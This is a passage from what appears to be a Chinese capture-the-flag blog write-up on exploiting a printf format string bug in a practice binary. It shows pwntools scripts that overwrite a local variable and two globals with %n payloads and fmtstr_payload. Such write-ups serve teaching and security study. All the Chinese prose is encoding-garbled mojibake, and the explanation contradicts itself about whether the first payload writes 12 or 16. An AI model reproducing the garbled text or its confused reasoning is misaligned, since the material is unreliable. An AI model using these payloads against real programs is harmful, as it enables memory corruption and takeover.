class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| å‚æ•°1=format                 | â† esp+4</span><br><span class="line">| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡   | â† esp</span><br><span class="line">      â†“</span><br></pre></td></tr></table></figure>

<p>æ­¤æ—¶ esp æŒ‡å‘ <strong>printf çš„è¿”å›åœ°å€</strong>ï¼Œå†å¾€ä¸Šæ˜¯ printf çš„å‚æ•°ã€‚</p>
<p>ğŸŒŸ é˜¶æ®µ 2ï¸âƒ£ï¼šè¿›å…¥ <code>printf</code> å</p>
<p>åœ¨ printf å¼€å§‹æ‰§è¡Œåï¼Œå®ƒå»ºç«‹è‡ªå·±çš„æ ˆå¸§ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">      â†‘ é«˜åœ°å€</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| å‚æ•°nï¼ˆmain çš„å‚æ•°ï¼‰           |</span><br><span class="line">| â€¦                            |</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| è¿”å›åœ°å€ â†’ main              |</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| ä¸Šä¸€ä¸ª ebp                   | â† ebp (vulnfunc)</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| vulnfunc å±€éƒ¨å˜é‡            |</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| å‚æ•°1=format                 | â† ebp+8</span><br><span class="line">| è¿”å›åœ°å€ â†’ vulnfunc+ä¸‹ä¸€æ¡   | â† ebp+4</span><br><span class="line">| ä¸Šä¸€ä¸ª ebp                   | â† ebp (printf)</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">| printf å±€éƒ¨å˜é‡              | â† esp</span><br><span class="line">      â†“</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œï¼š</p>
<ul>
<li><code>printf</code> æŠŠå½“å‰çš„ ebp å‹æ ˆ</li>
<li>æŠŠ ebp è®¾ç½®ä¸º esp</li>
<li>esp å†å‘ä¸‹ç•™å‡ºå±€éƒ¨å˜é‡ç©ºé—´</li>
</ul>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721144623118.png"  alt="image-20250721144623118"></p>
<p>scanfå‡½æ•°ä¼šæŠŠè¯»å–åˆ°çš„æ•°æ”¾åœ¨æ ˆä¸Šä¸€ä¸ªç©ºé—´ï¼Œç„¶å%pä¼šæŠŠå®ƒæ³„éœ²å‡ºæ¥</p>
<ol>
<li>ä½¿ç”¨ <code>scanf</code> è¯»å–ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæœ€å¤š 100 å­—èŠ‚ï¼‰ï¼Œå­˜å…¥ <code>format</code> ç¼“å†²åŒºï¼›</li>
<li>ç„¶åç›´æ¥å°†è¿™ä¸ªå­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ä¼ ç»™ <code>printf</code>ï¼Œå³ï¼š<code>printf(format);</code></li>
</ol>
<h3 id="overwrite-è¦†ç›–ä»»æ„åœ°å€å†…å­˜"><a href="#overwrite-è¦†ç›–ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="overwrite(è¦†ç›–ä»»æ„åœ°å€å†…å­˜)"></a>overwrite(è¦†ç›–ä»»æ„åœ°å€å†…å­˜)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721153203305.png"  alt="image-20250721153203305"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721153247877.png"  alt="image-20250721153247877"></p>
<p>æ‰€ä»¥è¿™é“é¢˜çš„é‡ç‚¹æ˜¯ä¿®æ”¹å‡ ä¸ªæ•°çš„å€¼</p>
<p>1ï¼‰å°†aè¦†ç›–ä¸º0x10ã€‚</p>
<p>2ï¼‰å°†bè¦†ç›–ä¸º2ã€‚</p>
<p>3ï¼‰å°†cè¦†ç›–ä¸º0x12345678ã€‚</p>
<p>å…¶ä¸­aæ˜¯å±€éƒ¨å˜é‡ï¼Œb,cæ˜¯å…¨å±€å˜é‡</p>
<p>å±€éƒ¨å˜é‡å­˜å‚¨åœ¨æ ˆä¸Šï¼Œå…¨å±€å˜é‡å­˜å‚¨åœ¨æ•°æ®æ®µä¸­ï¼ˆåˆ†ä¸ºå·²åˆå§‹åŒ–rodataå’Œæœªåˆå§‹åŒ–bssä¸¤éƒ¨åˆ†ï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+---------------------+ &lt;--- é«˜å†…å­˜åœ°å€</span><br><span class="line">| å‘½ä»¤è¡Œå‚æ•° &amp; ç¯å¢ƒå˜é‡ |</span><br><span class="line">+---------------------+</span><br><span class="line">|       æ ˆ (Stack)    |  &lt;-- å±€éƒ¨å˜é‡ã€å‡½æ•°å‚æ•°ã€è¿”å›åœ°å€</span><br><span class="line">|                     |</span><br><span class="line">|   Function Call N   |</span><br><span class="line">|   (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|</span><br><span class="line">|   Function Call 2   |</span><br><span class="line">|   (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|</span><br><span class="line">|   Function Call 1   |</span><br><span class="line">|   (å±€éƒ¨å˜é‡, è¿”å›åœ°å€ç­‰)|</span><br><span class="line">|        ...          |</span><br><span class="line">|                     |</span><br><span class="line">|        ç©ºé—²         |</span><br><span class="line">|                     |</span><br><span class="line">+---------------------+</span><br><span class="line">|       å † (Heap)     |  &lt;-- åŠ¨æ€åˆ†é…å†…å­˜ (malloc/new)</span><br><span class="line">|                     |</span><br><span class="line">|        ...          |</span><br><span class="line">+---------------------+</span><br><span class="line">|   .bss æ®µ (æœªåˆå§‹åŒ–æ•°æ®) |  &lt;-- æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: b)</span><br><span class="line">+---------------------+</span><br><span class="line">|   .data æ®µ (å·²åˆå§‹åŒ–æ•°æ®) |  &lt;-- å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ (ä¾‹å¦‚: c)</span><br><span class="line">+---------------------+</span><br><span class="line">|     .text æ®µ (ä»£ç )   |  &lt;-- ç¨‹åºæ‰§è¡Œä»£ç  (æŒ‡ä»¤)</span><br><span class="line">+---------------------+</span><br><span class="line">|       ä¿ç•™åŒºåŸŸ      |</span><br><span class="line">+---------------------+ &lt;--- ä½å†…å­˜åœ°å€</span><br></pre></td></tr></table></figure>



<h4 id="açš„å¤„ç†ï¼ˆå±€éƒ¨å˜é‡ï¼‰"><a href="#açš„å¤„ç†ï¼ˆå±€éƒ¨å˜é‡ï¼‰" class="headerlink" title="açš„å¤„ç†ï¼ˆå±€éƒ¨å˜é‡ï¼‰"></a>açš„å¤„ç†ï¼ˆå±€éƒ¨å˜é‡ï¼‰</h4><p>é¦–å…ˆï¼Œaæ˜¯å±€éƒ¨å˜é‡ï¼Œå±€éƒ¨å˜é‡æ˜¯å­˜å‚¨åœ¨æ ˆä¸Šçš„ï¼Œå…¶åœ°å€ä¼šå› ä¸ºå¼€å¯ASLRè€Œå˜åŒ–ï¼Œæ‰€ä»¥åœ¨å‡½æ•°ä¸­å°†açš„åœ°å€æ‰“å°å‡ºæ¥äº†</p>
<h5 id="è„šæœ¬-1"><a href="#è„šæœ¬-1" class="headerlink" title="è„šæœ¬"></a><strong>è„šæœ¬</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./overwrite&quot;)</span><br><span class="line">a=int(p.recvuntil(&#x27;\n&#x27;,drop=True),16)</span><br><span class="line">print(hex(a))</span><br><span class="line">payload=p32(a)+b&quot;%12c&quot;+b&quot;%8$n&quot;</span><br><span class="line">p.sendline(payload)</span><br><span class="line">m=p.recv()</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p>intå’Œu32()</p>
<table>
<thead>
<tr>
<th>å‡½æ•°</th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>int(..., 16)</code></td>
<td>æ¥æ”¶åˆ°çš„æ˜¯å­—ç¬¦ä¸²å½¢å¼çš„åœ°å€ï¼ˆå¦‚<code>&quot;0xffa79dbc&quot;</code>ï¼‰</td>
<td>è½¬æ¢ä¸ºæ•´æ•°åœ°å€</td>
<td>ä¸»åŠ¨æ³„éœ²åœ°å€</td>
</tr>
<tr>
<td><code>u32(...)</code></td>
<td>æ¥æ”¶åˆ°çš„æ˜¯åŸå§‹ 4 å­—èŠ‚æ•°æ®ï¼ˆå¦‚<code>b&#39;\xbc\x9d\xa7\xff&#39;</code>ï¼‰</td>
<td>å°†å°ç«¯åºçš„ 4 å­—èŠ‚è½¬ä¸ºæ•´æ•°</td>
<td>è°ƒç”¨æ³„éœ²åœ°å€</td>
</tr>
</tbody></table>
<p>ğŸ§© <code>p32(a_addr)</code> æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿ</p>
<p>æ„é€ çš„ <code>p32(a_addr)</code> ä¼šè¢« <code>printf</code> å½“ä½œä¸€ä¸ªå‚æ•°å¤„ç†ï¼š</p>
<ul>
<li>å®ƒè¢«å‹å…¥æ ˆä¸Šï¼›</li>
<li><code>%8$n</code> ä¼šä»ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®è¯»å–å®ƒï¼›</li>
<li>è¿™ä¸ªåœ°å€å°±æ˜¯å†™å…¥çš„ç›®æ ‡åœ°å€ã€‚</li>
</ul>
<p>ğŸ§© <code>%12c</code> æ˜¯æ€ä¹ˆç”¨çš„ï¼Ÿï¼ˆç›®æ ‡æ˜¯16ï¼Œaçš„åœ°å€å å››ä¸ªå­—èŠ‚ï¼‰</p>
<ul>
<li><code>%12c</code> è¾“å‡º 12 ä¸ªå­—ç¬¦ï¼ˆå¦‚ç©ºæ ¼ï¼‰ï¼›</li>
<li><code>%n</code> ä¼šæŠŠå½“å‰è¾“å‡ºçš„å­—ç¬¦æ€»æ•°å†™å…¥æŒ‡å®šåœ°å€ï¼›</li>
<li>æ‰€ä»¥ <code>%12c</code> çš„ä½œç”¨æ˜¯è®© <code>%n</code> å†™å…¥ <code>12</code>ï¼›</li>
<li>å®ƒæœ¬èº«ä¸å†™å…¥å†…å­˜ï¼Œä½†ä¼šå½±å“ <code>%n</code> çš„å€¼ã€‚</li>
</ul>
<p>ä¸èƒ½æ¢æˆbâ€™aâ€™*12,è¿™ä¸ªä¸ä¼šå½±å“%nçš„æ€»æ•°</p>
<p><strong>å·¥ä½œåŸç†ï¼š</strong></p>
<ol>
<li>å½“ <code>printf(payload)</code> æ‰§è¡Œæ—¶ï¼Œ<code>payload</code> å­—ç¬¦ä¸²ä¼šè¢«æ”¾åˆ°æ ˆä¸Šã€‚</li>
<li><code>printf</code> å¼€å§‹è§£æ <code>payload</code>ã€‚å®ƒä¼šæŠŠ <code>p32(a_addr)</code> è§†ä¸ºä¸€ä¸ªæ™®é€šçš„å­—ç¬¦ä¸²ï¼ˆä½†å®ƒå®é™…ä¸Šæ˜¯ <code>v1</code> çš„åœ°å€ï¼‰ã€‚</li>
<li>ç„¶åé‡åˆ° <code>%12c</code>ï¼Œå®ƒè¾“å‡º 12 ä¸ªå­—ç¬¦ã€‚</li>
<li>æ¥ç€é‡åˆ° <code>%8$n</code>ã€‚æ­¤æ—¶ <code>printf</code> å·²ç»è¾“å‡ºäº† 12 ä¸ªå­—ç¬¦ã€‚å®ƒä¼šå»æ ˆä¸Šå¯»æ‰¾ç¬¬ 8 ä¸ªå‚æ•°çš„åœ°å€ã€‚ç”±äº <code>p32(a_addr)</code> æ”¾åœ¨äº† payload çš„å¼€å¤´ï¼Œå¹¶ä¸”å…¶é•¿åº¦æ˜¯ 4 å­—èŠ‚ï¼Œå®ƒä¼šæ­£å¥½è½åœ¨æ ˆä¸Šç¬¬ 8 ä¸ªå‚æ•°çš„ä½ç½®ä¸Šï¼ˆè¿™ä¸ªåç§»é‡æ˜¯ç»è¿‡è°ƒè¯•ç¡®å®šçš„ï¼‰ã€‚</li>
<li><code>printf</code> ä¼šå°†å½“å‰å·²è¾“å‡ºçš„å­—ç¬¦æ•° <code>12</code> <strong>å†™å…¥</strong>åˆ° <code>p32(a_addr)</code> æ‰€è¡¨ç¤ºçš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯å±€éƒ¨å˜é‡ <code>v1</code> çš„åœ°å€ã€‚</li>
<li>æœ€ç»ˆï¼Œ<code>v1</code> çš„å€¼è¢«ä¿®æ”¹ä¸º <code>12</code>ã€‚</li>
</ol>
<h4 id="bçš„å¤„ç†ï¼ˆå…¨å±€å°æ•°ï¼‰"><a href="#bçš„å¤„ç†ï¼ˆå…¨å±€å°æ•°ï¼‰" class="headerlink" title="bçš„å¤„ç†ï¼ˆå…¨å±€å°æ•°ï¼‰"></a>bçš„å¤„ç†ï¼ˆå…¨å±€å°æ•°ï¼‰</h4><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721202346937.png"  alt="image-20250721202346937"></p>
<p>b,cçš„åœ°å€å¯ä»¥ç›´æ¥æ‰¾åˆ°</p>
<h5 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬"></a><strong>è„šæœ¬</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./overwrite&quot;)</span><br><span class="line">elf = ELF(&quot;./overwrite&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b printf&quot;)</span><br><span class="line">a=int(p.recvuntil(&quot;\n&quot;,drop=True),16)</span><br><span class="line">print(hex(a))</span><br><span class="line">b=0x0804A028</span><br><span class="line">payload=b&#x27;aa&#x27;+b&#x27;%10$n&#x27;+b&#x27;b&#x27;+p32(b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">info=p.recvline()</span><br><span class="line">if b&quot;overwrite b for a small value&quot; in info:</span><br><span class="line">  print(b&quot;Success\n&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>ä¸ºä»€ä¹ˆä¸èƒ½æŒ‰ç…§è¦†ç›– <code>a</code> çš„æ–¹æ³•ï¼Ÿ</strong>ï¼ˆå› ä¸º%nï¼Œbçš„åœ°å€å·²ç»è¶…è¿‡2äº†ï¼Œæ‰€ä»¥bçš„åœ°å€åªèƒ½åœ¨%_$nä¹‹åï¼‰</p>
<ol>
<li><strong>åç§»é‡è®¡ç®—çš„å·®å¼‚</strong>ï¼š åœ¨è¦†ç›– <code>a</code> çš„æ–¹æ³•ä¸­ï¼Œ<code>p32(a_addr)</code> æ”¾åœ¨äº† payload çš„æœ€å¼€å¤´ï¼Œå¹¶ä¸” <code>printf</code> å‘ç°è¿™ä¸ªå¼€å¤´åœ¨å®ƒçš„å‚æ•°åˆ—è¡¨ä¸­æ˜¯<strong>ç¬¬ 8 ä¸ª</strong>ã€‚ ä½†æ˜¯ï¼Œå¦‚æœå°† <code>p32(b_addr)</code> ä¹Ÿæ”¾åœ¨ payload çš„å¼€å¤´å¹¶å°è¯•ç”¨ <code>%8$n</code> å†™å…¥ï¼Œå¯èƒ½ä¼šé‡åˆ°é—®é¢˜ï¼š<ul>
<li><strong>åœ°å€å€¼ä¸æ ¼å¼ç¬¦å†²çª</strong>ï¼š<code>0x0804A028</code> è¿™ä¸ªåœ°å€æœ¬èº«å¦‚æœè¢« <code>printf</code> è§£ææˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œå¯èƒ½ä¼šåŒ…å« <code>%</code> æˆ–å…¶ä»–ç‰¹æ®Šå­—ç¬¦ï¼Œå¯¼è‡´ <code>printf</code> å´©æºƒæˆ–è¡Œä¸ºå¼‚å¸¸ã€‚ä¾‹å¦‚ï¼Œåœ°å€çš„æŸä¸ªå­—èŠ‚å¯èƒ½è¢«è§£é‡Šä¸º <code>%s</code> æˆ– <code>%x</code> çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´ <code>printf</code> è¯•å›¾è¯»å–æ— æ•ˆçš„å†…å­˜åœ°å€ã€‚</li>
<li><strong>æ§åˆ¶æ€§é—®é¢˜</strong>ï¼šæˆ‘ä»¬é€šå¸¸å¸Œæœ›å°†è¦å†™å…¥çš„åœ°å€æ”¾åœ¨æ ¼å¼å­—ç¬¦ä¸²çš„æœ«å°¾ï¼Œè¿™æ ·å®ƒå°±ä¸ä¼šè¢« <code>printf</code> è¯¯è®¤ä¸ºæ˜¯æ ¼å¼ç¬¦çš„ä¸€éƒ¨åˆ†æ¥å¤„ç†ï¼Œè€Œåªæ˜¯ä¸€ä¸ªæ™®é€šçš„ 4 å­—èŠ‚æ•°æ®ã€‚</li>
</ul>
</li>
</ol>
<table>
<thead>
<tr>
<th>ç‰¹æ€§</th>
<th>è¦†ç›– <code>v1</code> (å±€éƒ¨å˜é‡)</th>
<th>è¦†ç›– <code>b</code> (å…¨å±€å˜é‡)</th>
</tr>
</thead>
<tbody><tr>
<td><strong>ç›®æ ‡ç±»å‹</strong></td>
<td>æ ˆä¸Šçš„å±€éƒ¨å˜é‡</td>
<td>æ•°æ®æ®µä¸Šçš„å…¨å±€å˜é‡</td>
</tr>
<tr>
<td><strong>åœ°å€æ¥æº</strong></td>
<td>è¿è¡Œæ—¶æ³„éœ² (æ¯æ¬¡å¯èƒ½ä¸åŒ)</td>
<td>é™æ€å›ºå®š (ç¼–è¯‘æ—¶ç¡®å®š)</td>
</tr>
<tr>
<td><strong><code>p32(addr)</code> ä½ç½®</strong></td>
<td>æ”¾åœ¨ <code>payload</code> çš„<strong>å¼€å¤´</strong></td>
<td>æ”¾åœ¨ <code>payload</code> çš„<strong>æœ«å°¾</strong></td>
</tr>
<tr>
<td><strong><code>%n</code> åç§»</strong></td>
<td><code>8$</code> (å› ä¸ºåœ°å€æ”¾åœ¨å¼€å¤´ï¼Œä¸”åœ¨ç¬¬ 8 ä¸ªå‚æ•°ä½ç½®)</td>
<td><code>10$</code> (å› ä¸ºåœ°å€æ”¾åœ¨æœ«å°¾ï¼Œä¸”åœ¨ç¬¬ 10 ä¸ªå‚æ•°ä½ç½®)</td>
</tr>
<tr>
<td><strong>ä¸»è¦è€ƒé‡</strong></td>
<td>ç¡®ä¿ <code>p32(addr)</code> ä¸è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œä¸”åœ¨æ­£ç¡®åç§»</td>
<td>é¿å… <code>b_addr</code> å­—èŠ‚è¢«è¯¯è§£ä¸ºæ ¼å¼ç¬¦ï¼Œæ›´ç¨³å®šåœ°ä½œä¸ºå‚æ•°åœ°å€</td>
</tr>
</tbody></table>
<p>å¥½çš„ï¼Œå¦‚æœä½ ç¡®è®¤è¿™ä¸ª <code>b</code> æ˜¯<strong>å¿…é¡»çš„</strong>ï¼Œé‚£ä¹ˆå®ƒåœ¨ payload ä¸­çš„å­˜åœ¨ï¼Œå°±æ„å‘³ç€å®ƒåœ¨æ ˆçš„å¸ƒå±€å’Œ <code>printf</code> å¯¹å‚æ•°çš„è§£æä¸­èµ·åˆ°äº†å…³é”®ä½œç”¨ï¼Œé€šå¸¸æ˜¯<strong>ä¿è¯äº† <code>p32(b_addr)</code> çš„æ­£ç¡®å¯¹é½ï¼Œä½¿å…¶è½åœ¨ <code>%10$n</code> é¢„æœŸçš„å‚æ•°ä½ç½®</strong>ã€‚</p>
<p>è®©æˆ‘ä»¬æ¥è¯¦ç»†åˆ†æï¼Œä¸ºä»€ä¹ˆå¤šä¸€ä¸ª <code>b</code> åè€Œå¯èƒ½æˆä¸ºâ€œå¿…é¡»çš„â€ã€‚</p>
<p><strong>æœ‰ <code>b</code> çš„è¯¦ç»†åˆ†æ</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&quot;aa&quot; + b&quot;%10$n&quot; + b&quot;b&quot; + p32(b_addr)</span><br></pre></td></tr></table></figure>

<p>è®©æˆ‘ä»¬è®¡ç®—æ¯ä¸ªéƒ¨åˆ†çš„é•¿åº¦ï¼š</p>
<ol>
<li><code>b&quot;aa&quot;</code>ï¼š2 å­—èŠ‚</li>
<li><code>b&quot;%10$n&quot;</code>ï¼š5 å­—èŠ‚</li>
<li><code>b&quot;b&quot;</code>ï¼š1 å­—èŠ‚</li>
<li><code>p32(b_addr)</code>ï¼š4 å­—èŠ‚ (å‡è®¾ <code>b_addr</code> æ˜¯ <code>0x0804A028</code>)</li>
</ol>
<p><strong>æ€»å­—èŠ‚æ•° &#x3D; 2 + 5 + 1 + 4 &#x3D; 12 å­—èŠ‚</strong>,åœ¨è¿™é‡Œï¼Œbæ˜¯ä¸ºäº†è¡¥è¶³å­—èŠ‚</p>
<h4 id="cçš„å¤„ç†ï¼ˆå…¨å±€å¤§æ•°ï¼‰"><a href="#cçš„å¤„ç†ï¼ˆå…¨å±€å¤§æ•°ï¼‰" class="headerlink" title="cçš„å¤„ç†ï¼ˆå…¨å±€å¤§æ•°ï¼‰"></a>cçš„å¤„ç†ï¼ˆå…¨å±€å¤§æ•°ï¼‰</h4><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250721200707341.png"  alt="image-20250721200707341"></p>
<p>è¿™æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œè€ƒè™‘é€å­—èŠ‚å†™å…¥</p>
<p>è¿™é‡Œæƒ³æŠŠcè¦†ç›–ä¸º0x12345678ï¼Œè€Œcçš„åœ°å€æ˜¯0x0804A02Cï¼Œæ‰€ä»¥åŸºæœ¬ç›®æ ‡æ˜¯ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804A02C:\x78</span><br><span class="line">0x0804A02D:\x56</span><br><span class="line">0x0804A02E:\x34</span><br><span class="line">0x0804A02F:\x12</span><br></pre></td></tr></table></figure>

<h5 id="è„šæœ¬-3"><a href="#è„šæœ¬-3" class="headerlink" title="è„šæœ¬"></a><strong>è„šæœ¬</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p=process(&quot;./overwrite&quot;)</span><br><span class="line"></span><br><span class="line">a=int(p.recvuntil(&quot;\n&quot;,drop=True),16)</span><br><span class="line">print(hex(a))</span><br><span class="line"></span><br><span class="line">c=0x0804A02C</span><br><span class="line">payload=fmtstr_payload(offset=8,writes=&#123;c:0x12345678&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">info =p.recvline()</span><br><span class="line">if b&quot;overwrite c for a big value&quot; in info:</span><br><span class="line">  print(b&quot;Success&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="fmtstr-payload"><a href="#fmtstr-payload" class="headerlink" title="fmtstr_payload"></a>fmtstr_payload</h4><p><code>fmtstr_payload</code> æ˜¯ <strong>pwntools æä¾›çš„ä¸€ä¸ªè‡ªåŠ¨åŒ–å·¥å…·</strong> ï¼Œç”¨äº<strong>æ„é€ æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼ˆFormat String Vulnerabilityï¼‰çš„ payload</strong> ã€‚</p>
<p>å®ƒçš„ä½œç”¨æ˜¯ï¼š</p>
<blockquote>
<p><strong>è‡ªåŠ¨è®¡ç®—å­—ç¬¦æ•°å¹¶æ„é€  payloadï¼Œç”¨äºå†™å…¥ä»»æ„åœ°å€çš„å€¼ï¼ˆå¦‚ GOT è¡¨ã€å˜é‡ã€è¿”å›åœ°å€ç­‰ï¼‰</strong> </p>
</blockquote>
<p>ğŸ§ª <code>fmtstr_payload</code> çš„ä½¿ç”¨æ–¹æ³•</p>
<ol>
<li><strong>åŸºæœ¬è¯­æ³•</strong></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li><strong>å‚æ•°è¯´æ˜</strong></li>
</ol>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td><code>offset</code></td>
<td>æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»é‡ï¼ˆä½ çš„è¾“å…¥åœ¨ç¬¬å‡ ä¸ª<code>%p</code>çš„ä½ç½®ï¼‰</td>
</tr>
<tr>
<td><code>writes</code></td>
<td>ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºä½ è¦å†™å…¥çš„åœ°å€å’Œå€¼ï¼Œå¦‚<code>&#123;addr1: value1, addr2: value2&#125;</code></td>
</tr>
<tr>
<td><code>numbwritten</code></td>
<td>å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ï¼ˆé»˜è®¤ä¸º 0ï¼Œå¯ä»¥å¿½ç•¥ï¼‰</td>
</tr>
<tr>
<td><code>write_size</code></td>
<td>å†™å…¥å¤§å°ï¼Œå¯é€‰ï¼š<code>&#39;byte&#39;</code>ã€<code>&#39;short&#39;</code>ã€<code>&#39;int&#39;</code>ï¼ˆé»˜è®¤æ˜¯<code>&#39;byte&#39;</code>ï¼‰</td>
</tr>
</tbody></table>
<p>ğŸ§© ç¤ºä¾‹ 1ï¼šå†™å…¥ä¸€ä¸ªåœ°å€ä¸º 16</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./vuln&quot;)</span><br><span class="line">offset = 8  # åç§»é‡</span><br><span class="line">addr = elf.symbols[&#x27;a&#x27;]  # å‡è®¾ä½ è¦å†™å…¥å˜é‡ a çš„åœ°å€</span><br><span class="line"></span><br><span class="line"># æ„é€  payloadï¼šå†™å…¥ a = 16</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 16&#125;)</span><br><span class="line"></span><br><span class="line">p = process(&quot;./vuln&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



